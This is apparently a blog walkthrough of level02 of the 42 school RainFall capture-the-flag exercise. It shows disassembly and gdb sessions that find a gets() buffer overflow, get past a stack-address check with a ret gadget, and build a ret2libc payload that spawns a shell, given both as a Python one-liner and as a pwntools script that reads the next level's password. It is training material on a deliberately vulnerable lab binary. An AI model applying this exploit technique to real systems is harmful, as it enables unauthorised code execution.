---
title: 42 RainFall Level02 - Walkthrough 🚀
tags:
  - cyber-security
  - rainfall
  - assembly
  - ctf
  - ret2win
  - ROP
  - gadget
categories:
  - ctfs
  - 42project
date: 2025-02-22 10:41:02
---

# Welcome to RainFall

![rainfall](/images/rainfall.jpg)

# 🌊 Level02 of Rainfall Project 🌊

## 🔍 Introduction

Hello, today I'm gonna show you the my read-me of the level02 of rainfall project from 42 school.

## 🔬 Research & Analysis

So, first of all we have a binary named "level2" we can use objdump to disassemble it.

Once finished you should have the following output

```asm
level2@RainFall:~$ objdump -M intel -d ./level2

080484d4 <p>:
 80484d4:       55                      push   ebp
 80484d5:       89 e5                   mov    ebp,esp
 80484d7:       83 ec 68                sub    esp,0x68
 80484da:       a1 60 98 04 08          mov    eax,ds:0x8049860
 80484df:       89 04 24                mov    DWORD PTR [esp],eax
 80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>
 80484e7:       8d 45 b4                lea    eax,[ebp-0x4c]
 80484ea:       89 04 24                mov    DWORD PTR [esp],eax
 80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
 80484f2:       8b 45 04                mov    eax,DWORD PTR [ebp+0x4]
 80484f5:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax
 80484f8:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]
 80484fb:       25 00 00 00 b0          and    eax,0xb0000000
 8048500:       3d 00 00 00 b0          cmp    eax,0xb0000000
 8048505:       75 20                   jne    8048527 <p+0x53>
 8048507:       b8 20 86 04 08          mov    eax,0x8048620
 804850c:       8b 55 f4                mov    edx,DWORD PTR [ebp-0xc]
 804850f:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 8048513:       89 04 24                mov    DWORD PTR [esp],eax
 8048516:       e8 85 fe ff ff          call   80483a0 <printf@plt>
 804851b:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 8048522:       e8 a9 fe ff ff          call   80483d0 <_exit@plt>
 8048527:       8d 45 b4                lea    eax,[ebp-0x4c]
 804852a:       89 04 24                mov    DWORD PTR [esp],eax
 804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>
 8048532:       8d 45 b4                lea    eax,[ebp-0x4c]
 8048535:       89 04 24                mov    DWORD PTR [esp],eax
 8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt>
 804853d:       c9                      leave  
 804853e:       c3                      ret    

0804853f <main>:
 804853f:       55                      push   ebp
 8048540:       89 e5                   mov    ebp,esp
 8048542:       83 e4 f0                and    esp,0xfffffff0
 8048545:       e8 8a ff ff ff          call   80484d4 <p>
 804854a:       c9                      leave  
 804854b:       c3                      ret    
 804854c:       90                      nop
 804854d:       90                      nop
 804854e:       90                      nop
 804854f:       90                      nop
```


## 💡 Key Observations:

- There are two functions: `main` and `p`.
- Inside function `p`, we see a call to `gets()` 📌.
- The `gets()` function is deprecated ❌ because it does not check input size, making it vulnerable to buffer overflow attacks.

By the way A usage of gets function is unsecure, you can overwrite EIP register and as you know the EIP register is a instruction pointer like (Program Counter PC) is just a simple register which point to the next current instruction which cpu will be execute you can observe that in your gdb with `gef` or `peda`.

So if we arrive to overwrite the EIP register we can control the flow execution of the program.

```asm
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x80484f2 in p; saved eip 0x804854a
 called by frame at 0xbffff740
 Arglist at 0xbffff728, args: 
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c
(gdb) x/x 0xbffff730 - 4
0xbffff72c:    0x4a
(gdb) x/4x 0xbffff730 - 4
0xbffff72c:    0x4a    0x85    0x04    0x08
(gdb) p/d 0xbffff72c - 0xbffff6dc
$1 = 80
```

### 🏹 Find the padding

- To find the padding we can use the `info frame` directive to show the argument list and the saved of the EIP register. 

- If we take the arguments list and substract 4 bytes we find the address of the saved EIP on the stack.

When you have this address you can just substract it with the buffer address, we can just get it after the call of the gets@plts instruction.

```sh
0x080484f2 in p ()
(gdb) info registers 
eax            0xbffff6dc    -1073744164
ecx            0xb7fd28c4    -1208145724
edx            0xbffff6dc    -1073744164
ebx            0xb7fd0ff4    -1208152076
esp            0xbffff6c0    0xbffff6c0
ebp            0xbffff728    0xbffff728
esi            0x0    0
edi            0x0    0
eip            0x80484f2    0x80484f2 <p+30>
eflags         0x200282    [ SF IF ID ]
cs             0x73    115
ss             0x7b    123
ds             0x7b    123
es             0x7b    123
fs             0x0    0
gs             0x33    51

(gdb) x/s 0xbffff6dc
0xbffff6dc:     "AAAA"
```

As you can see in the eax register there is the buffer address we have passed to the first parameters to the gets function.
Now, we can substract the address on the stack which pointed to saved eip with the buffer address.

```sh
(gdb) p/d 0xbffff72c - 0xbffff6dc
$1 = 80
```


Now we know the padding you can just experiment with this payload for example

```gdb
run < <(python -c "print('A'*80+'B'*4)")
```

If we run the following command and you check the frame just before a ret instruction you can see the saved of eip has been overwrited.

The binary is compiled without stack protection (canary not found).

The gets() function is used, which does not limit input size, leading to buffer overflow.

By overflowing the buffer, we can control the return address and execute arbitrary code.

## 🛡️ Protection condition

The following binary have a stack protection, if a stack prefix address is detected in the buffer provided with theses following two instructions

```sh
 80484fb:       25 00 00 00 b0          and    eax,0xb0000000
 8048500:       3d 00 00 00 b0          cmp    eax,0xb0000000
```
Then a call to `_exit` is performed.

there is a big problem because the system address is on the stack and also have the same prefix, so to bypass this protection we just put an address of a gadget. For example the ret instructon from the p function also the ret instruction than we continue the flow execution of our payload chain.

Finally, you just need to find the system and binsh addresses on the libc, and use a 16-byte address to avoid segfaulting with the system function. 

```sh
(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```

0x0804854b = ret
0xb7e6b060 = system
0xb7e5ebe0 = exit (aligned function)
0xb7f8cc58 = "/bin/sh"

## 🚀 Exploitation

You can finally run the following exploit manualy or using the python script which use pwntools library

```sh
level2@RainFall:~$ (python -c "print '\x42' * 80 + '\x08\x04\x85\x4b'[::-1] + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1] + '\xb7\xf8\xcc\x58'[::-1]"; cat) | ./level2 
```

Using Python script don't forget to install pwntools with this following command:

```sh
python3 -m pip install pwntools
```

```python
#!/usr/bin/env python3
from pwn import *
context.update(arch='i386', os='linux')
s=ssh(host='10.12.250.34',user='level2',password='PASSWORD',port=4242)

p = s.process("./level2")

ret = p32(0x0804853e)
system = p32(0xb7e6b060)
exit = p32(0xb7e5ebe0)
binsh = p32(0xb7f8cc58)

p.info(p.elf)

payload = b'\x42' * 80
payload += ret # ret
payload += system # system
payload += exit # exit
payload += binsh # "/bin/sh"

p.sendline(payload)
p.sendline(b"cd ../level3")
p.sendline(b"cat .pass")
flag = p.recvline()
flag = p.recvuntil(b'$ $')

p.info(flag)

p.interactive()
p.close()
```
